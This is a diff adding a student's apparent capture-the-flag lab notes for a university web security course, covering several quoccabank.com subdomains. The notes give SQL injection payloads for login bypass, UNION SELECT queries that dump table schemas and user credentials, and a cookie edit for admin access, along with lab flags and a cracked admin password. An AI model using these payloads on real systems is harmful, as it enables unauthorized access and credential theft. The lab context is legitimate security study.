@@ -381,9 +381,58 @@ notes subdomain
 
 
 
+# Week 4-5
+
+pay-portal subdomain
+
+- `" OR 1=1-- `
+- COMP6443{SQLilsPowerful}
+
+support subdomain
+
+​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+
+bigapp subdomain
+
+Objectives:
+
+- Login
+  - `' or 1=1;-- ` for username with any valid password
+  - Flag can be found in response header for login.html upon successful login
+- Make the banking product list return more than it should
+  - Injecting `') OR 1=1) UNION SELECT 1, table_name, 3, column_name, 5, 6 FROM information_schema.columns-- )` allowed me to access additional rows
+  - Inspecting the network and examining the API called, the flag appears in the response header if more than 20 (expected) rows are returned
+- Sort the banking products
+  - ORDER BY ID ASC
+  - Inject: `') OR 1=1) ORDER BY id ASC-- )`
+  - Note: union select * from bproducts doesn't give flag :(
+- Find alternate means to login other than the obvious (no SQLi required)
+  - 
+- Become admin without logging into admin
+  - Cookie (edit base_encoded email:user to email:admin)
+- Login to admin using its actual password without online brute-forcing
+  - Inject: `') OR 1=1) UNION SELECT 1, email, 3, password, 4, 5 FROM users-- )` to get all credentials
+  - Password hashed - rainbow table (MD5): admin@quoccabank.com with Admin@123
+  - Flag obtained - similar method to Login (1)
+- Create duplicate user with existing user's email
+  - Intercept registration of existing user's email - replace payload with url-encoded `Chris.Hall@lazy.com' OR 1=1-- )` - flag can be found in response header
 
 
 
+
+
+- Analyse network: https://bigapp.quoccabank.com/api/v1/bproducts?q={query}
+- Non-url encoded q=' or '1' = '1'-- : returns the syntax in error message
+  - OR pname LIKE '%' or '1' = '1'--%') AND bu IS NOT NULL)
+  - So MySQL query is something like SELECT id, pname, code, category, bu, owner FROM bproducts WHERE .. OR pname LIKE '%{}%') AND bu IS NOT NULL)
+  - We want something like: OR pname LIKE '%') OR 1=1
+  - `')) OR 1=1-- )` last bracket makes sure trailing space gets registered
+
+signin subdomain
+
+- Reset -> enter email to get password
+- Login -> makes a request to qdns subdomain
+- Navigate to qdns subdomain
 
 
 
